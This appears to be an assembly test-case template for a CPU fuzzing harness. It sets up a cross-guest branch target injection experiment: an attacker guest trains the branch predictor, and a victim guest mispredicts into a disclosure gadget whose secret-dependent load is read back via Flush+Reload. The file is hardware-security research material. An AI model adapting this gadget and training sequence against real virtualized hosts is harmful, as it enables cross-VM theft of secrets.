.intel_syntax noprefix

# ============================================================================
# V2V INJECTION — guest-user ATTACKER trains the BTB; guest-user VICTIM
# mispredicts into a disclosure gadget that leaks the victim's own secret.
#
# WHY V2V: both actors are guests, so both execute at the SAME guest-virtual
# base (GUEST_V_MEMORY_START=0). The attacker's `train` and the victim's
# `vmvictim_1` are each the FIRST function in their section (offset 0) and share
# an identical prefix, so their indirect jmps sit at the SAME virtual address ->
# the BTB source collides "for free". This is the alignment K2U/GS->HU could not
# get; here it isolates the question "does INJECTION work at all in this harness?"
# from the alignment problem.
#
# Direction (opposite of the residue template.asm):
#   attacker (vm)      : trains BTB[jmp PC] = disclosure, then F+R measures.
#   victim  (vmvictim) : arch jmp -> safe; MISPREDICT -> disclosure, which
#                        transiently loads [r14 + secret] and imprints a cache
#                        line the attacker reads back via the shared channel.
# Channel: x86_enable_hpa_gpa_collisions (both guests' data GPA -> main's HPA).
#
# Alignment detail: attacker `disclosure` is padded by a `safe`-sized block so it
# lands at the SAME in-section offset as the victim's `disclosure` (BTB target
# also collides). Both landings are landing_h2g (same size) -> no extra pad.
#
# Control: template-v2v-inject-no-jmp.asm removes both jmps (expect CLEAN).
# The shared channel is the SAME one the residue test (template.asm) already uses
# and reproduces with, so it needs no separate positive control here.
# ============================================================================

# ----------------------------- Host orchestrator ----------------------------
.section .data.main
.function_main_0:
    .macro.set_h2g_target.vm.function_vm_0:
    .macro.set_g2h_target.main.function_main_1:
    .macro.switch_h2g.vm.0:

.function_main_1:
    .macro.landing_g2h.main_1:
    # attacker (vm) trains the BTB
    .macro.set_h2g_target.vm.function_vm_train:
    .macro.set_g2h_target.main.function_main_2:
    .macro.switch_h2g.vm.1:

.function_main_2:
    .macro.landing_g2h.main_2:
    # run the guest victim (mispredict -> disclosure); NO IBPB in between
    .macro.set_h2g_target.vmvictim.function_vmvictim_1:
    .macro.set_g2h_target.main.function_main_3:
    xor rax, rax  # noremove
    xor rbx, rbx  # noremove
    xor rcx, rcx  # noremove
    xor rdx, rdx  # noremove
    xor rsi, rsi  # noremove
    xor rdi, rdi  # noremove
    .macro.switch_h2g.vmvictim.1:

.function_main_3:
    .macro.landing_g2h.main_3:
.macro.fault_handler:
.patch_placeholder_fault_handler:
    # attacker measures
    .macro.set_h2g_target.vm.function_vm_measure:
    .macro.set_g2h_target.main.function_main_4:
    .macro.switch_h2g.vm.2:

.function_main_4:
    .macro.landing_g2h.main_4:
    nop


# ----------------------------- Attacker (guest user, observer) --------------
# function_vm_train FIRST (offset 0) to mirror function_vmvictim_1.
.section .data.vm
.function_vm_train:
    .macro.landing_h2g.vm_1:
    # mirror the victim's prefix EXACTLY (same 6 loads at fixed addrs -> fixed,
    # input-independent footprint; values are not used as addresses, so no leak).
    xor rax, rax  # noremove
    mov rax, qword ptr [r14 + 0x2000] # noremove
    mov rbx, qword ptr [r14 + 0x2008] # noremove
    mov rcx, qword ptr [r14 + 0x2010] # noremove
    mov rdx, qword ptr [r14 + 0x2018] # noremove
    mov rsi, qword ptr [r14 + 0x2020] # noremove
    mov rdi, qword ptr [r14 + 0x2028] # noremove
    mfence # noremove
    lea rax, qword ptr [rip + .function_vm_disclosure]  # noremove
    jmp rax  # noremove                                 # trains BTB[this PC] = disclosure

# pad matching vmvictim_safe (lfence + switch_g2h + lfence); skipped by the jmp.
.function_vm_safe:
    lfence  # noremove
    .macro.switch_g2h.main.vm_safe:
    lfence  # noremove

.function_vm_disclosure:
    lfence  # noremove   (architectural jmp target; inert in the attacker)
    .macro.switch_g2h.main.vm_1:
    lfence

.function_vm_0:
    .macro.landing_h2g.vm_0:
    .macro.measurement_start.vm_0:
    .macro.switch_g2h.main.vm_0:
    lfence

.function_vm_measure:
    .macro.landing_h2g.vm_2:
    xor rax, rax  # noremove
    xor rbx, rbx  # noremove
    xor rcx, rcx  # noremove
    xor rdx, rdx  # noremove
    xor rsi, rsi  # noremove
    xor rdi, rdi  # noremove
    .macro.measurement_end.vm_2:
    .macro.switch_g2h.main.2:
    lfence


# ----------------------------- Victim (guest user) --------------------------
.section .data.vmvictim
.function_vmvictim_1:
    .macro.landing_h2g.vmvictim_1:
    xor rax, rax  # noremove
    mov rax, qword ptr [r14 + 0x2000] # noremove   (secret input in rax)
    mov rbx, qword ptr [r14 + 0x2008] # noremove
    mov rcx, qword ptr [r14 + 0x2010] # noremove
    mov rdx, qword ptr [r14 + 0x2018] # noremove
    mov rsi, qword ptr [r14 + 0x2020] # noremove
    mov rdi, qword ptr [r14 + 0x2028] # noremove
    mfence # noremove
    lea rbx, qword ptr [rip + .function_vmvictim_safe]  # noremove
    jmp rbx  # noremove                     # ARCH -> safe;  mispredict -> disclosure

.function_vmvictim_safe:
    lfence  # noremove
    .macro.switch_g2h.main.vmvictim_1:
    lfence

.function_vmvictim_disclosure:
    # Mask to a cache-line index WITHIN the main page (shared via the collision).
    and rax, 0b111111000000  # noremove
    mov rcx, qword ptr [r14 + rax]   # noremove   (transient: secret-dependent load)
    and rcx, 0b111111000000  # noremove
    mov rdx, qword ptr [r14 + rcx]   # noremove   (transient: imprint into cache)
    lfence  # noremove
    .macro.switch_g2h.main.vmvictim_2:
    lfence


# ----------------------------- Exit -----------------------------------------
.section .data.main
.test_case_exit:
